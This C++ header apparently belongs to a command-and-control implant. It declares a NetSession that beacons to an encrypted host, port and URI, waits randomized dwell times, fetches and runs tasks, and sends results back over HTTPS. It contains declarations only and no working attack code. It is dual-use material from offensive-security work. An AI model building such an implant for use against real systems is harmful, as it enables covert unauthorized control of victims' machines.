#pragma once

#define _SILENCE_CXX17_C_HEADER_DEPRECATION_WARNING

#include "tasks.h"

#include <string>
#include <string_view>
#include <mutex>
#include <future>
#include <atomic>
#include <vector>
#include <random> 

#include <boost/property_tree/ptree.hpp>

struct NetSession {
    NetSession(std::string host, std::string port, std::string uri);

    std::future<void> taskThread;

    void beacon();
    void setMeanDwell(double meanDwell);
    void setRunning(bool isRunning);
    void serviceTasks();
    void start();

private:
    std::string hostEncrypted;
    std::string portEncrypted;
    std::string uriEncrypted;

    std::exponential_distribution<double> dwellDistributionSeconds;
    std::atomic_bool isRunning;

    std::mutex taskMutex, resultsMutex;

    boost::property_tree::ptree results;
    std::vector<Task> tasks;

    std::random_device device;

    void parseTasks(const std::string& response);
    [[nodiscard]] std::string sendResults(const std::string& certPem);

    std::string decryptConfig(const std::string& encrypted) const;
};

[[nodiscard]] std::string sendHttpRequest(std::string_view host,
    std::string_view port, 
    std::string_view uri, 
    std::string_view payload,
    const std::string& certPem);